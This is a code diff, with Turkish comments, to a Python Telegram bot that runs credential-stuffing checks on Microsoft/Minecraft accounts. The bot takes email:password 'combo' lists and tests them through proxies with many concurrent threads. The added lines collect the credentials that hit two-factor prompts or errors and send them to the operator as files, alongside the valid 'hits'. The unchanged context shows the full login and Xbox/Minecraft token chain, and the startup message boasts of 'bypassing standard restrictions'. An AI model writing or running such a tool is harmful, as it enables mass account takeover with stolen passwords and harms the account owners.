@@ -33,6 +33,8 @@ PROXIES_FILE = "proxies.txt"
 user_sessions = {}  
 active_tasks = {}   
 user_hits = {} 
+user_2fa = {}       # YENİ: 2FA hesapları önbellekte tutmak için eklendi
+user_errors = {}    # YENİ: Hata veren hesapları önbellekte tutmak için eklendi
 
 # Threading & Request Settings (Adjusted for High Performance)
 MAX_RETRIES = 3
@@ -452,6 +454,8 @@ def handle_combos(message):
             bot.send_message(message.chat.id, f"🔥 `{len(combos)}` accounts detected.\nStarting high-speed execution with `{THREAD_COUNT}` concurrent threads...\n\n⛔ Type `/stop` anytime to halt execution and retrieve hits.")
             
             user_hits[user_id] = []
+            user_2fa[user_id] = []       # YENİ: 2FA Dizisini Başlat
+            user_errors[user_id] = []    # YENİ: Error Dizisini Başlat
             active_tasks[user_id] = True
             
             # Start background orchestrator using ThreadPoolExecutor pattern
@@ -495,28 +499,40 @@ def process_single_combo(user_id, combo, mode, proxies_list, stats, total, chat_
             with stats_lock:
                 stats["errors"] += 1
                 stats["checked"] += 1
+            with hit_lock:
+                if user_id in user_errors: user_errors[user_id].append(f"{email}:{password}")
             return
             
         ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
         
         if auth_status == "2fa":
             with stats_lock: stats["twofa"] += 1
+            with hit_lock:
+                if user_id in user_2fa: user_2fa[user_id].append(f"{email}:{password}")
         elif auth_status == "bad":
             with stats_lock: stats["bad"] += 1
         elif auth_status != "success" or not ms_token:
             with stats_lock: stats["errors"] += 1
+            with hit_lock:
+                if user_id in user_errors: user_errors[user_id].append(f"{email}:{password}")
         else:
             xbox_token, uhs = get_xbox_token(session, ms_token)
             if not xbox_token or not uhs:
                 with stats_lock: stats["errors"] += 1
+                with hit_lock:
+                    if user_id in user_errors: user_errors[user_id].append(f"{email}:{password}")
             else:
                 xsts_token = get_xsts_token(session, xbox_token)
                 if not xsts_token:
                     with stats_lock: stats["errors"] += 1
+                    with hit_lock:
+                        if user_id in user_errors: user_errors[user_id].append(f"{email}:{password}")
                 else:
                     mc_token = get_minecraft_token(session, uhs, xsts_token)
                     if not mc_token:
                         with stats_lock: stats["errors"] += 1
+                        with hit_lock:
+                            if user_id in user_errors: user_errors[user_id].append(f"{email}:{password}")
                     else:
                         account_type, _ = check_minecraft_entitlements(session, mc_token)
                         if not account_type:
@@ -577,6 +593,10 @@ def process_single_combo(user_id, combo, mode, proxies_list, stats, total, chat_
         with stats_lock:
             stats["errors"] += 1
             stats["checked"] += 1
+        try:
+            with hit_lock:
+                if user_id in user_errors: user_errors[user_id].append(combo.strip())
+        except: pass
 
 def multithread_manager(user_id, combos, mode, chat_id):
     proxies_list = load_proxies()
@@ -599,6 +619,9 @@ def multithread_manager(user_id, combos, mode, chat_id):
 
     bot.send_message(chat_id, f"🏁 **Task Finished!** (Total Checked: `{stats['checked']}`)", reply_markup=main_keyboard(user_id))
     
+    # --- YENİ: HITS, 2FA VE ERRORS ÇIKTI DOSYALARI ---
+    
+    # 1. HITS Çıktısı
     with hit_lock:
         has_hits = user_id in user_hits and len(user_hits[user_id]) > 0
         hits_count = len(user_hits[user_id]) if has_hits else 0
@@ -617,8 +640,45 @@ def multithread_manager(user_id, combos, mode, chat_id):
     else:
         bot.send_message(chat_id, "😢 No valid accounts were captured during this session.")
         
+    # 2. 2FA Çıktısı (email:password formatında)
+    with hit_lock:
+        has_2fa = user_id in user_2fa and len(user_2fa[user_id]) > 0
+        twofa_count = len(user_2fa[user_id]) if has_2fa else 0
+        
+    if has_2fa:
+        filename_2fa = f"2FA_{user_id}_{int(time.time())}.txt"
+        with open(filename_2fa, "w", encoding="utf-8") as f:
+            with hit_lock:
+                f.write("\n".join(user_2fa[user_id]))
+        
+        with open(filename_2fa, "rb") as f:
+            bot.send_document(chat_id, f, caption=f"🟡 **Total 2FA Accounts:** `{twofa_count}`")
+            
+        try: os.remove(filename_2fa)
+        except: pass
+
+    # 3. ERRORS Çıktısı (email:password formatında)
+    with hit_lock:
+        has_errors = user_id in user_errors and len(user_errors[user_id]) > 0
+        errors_count = len(user_errors[user_id]) if has_errors else 0
+        
+    if has_errors:
+        filename_err = f"Errors_{user_id}_{int(time.time())}.txt"
+        with open(filename_err, "w", encoding="utf-8") as f:
+            with hit_lock:
+                f.write("\n".join(user_errors[user_id]))
+        
+        with open(filename_err, "rb") as f:
+            bot.send_document(chat_id, f, caption=f"❌ **Total Error Accounts:** `{errors_count}`")
+            
+        try: os.remove(filename_err)
+        except: pass
+        
+    # Temizlik İşlemleri
     if user_id in active_tasks: del active_tasks[user_id]
     if user_id in user_hits: del user_hits[user_id]
+    if user_id in user_2fa: del user_2fa[user_id]
+    if user_id in user_errors: del user_errors[user_id]
 
 if __name__ == '__main__':
     print("[+] Chester Lua initialized. Bypassing standard restrictions...")
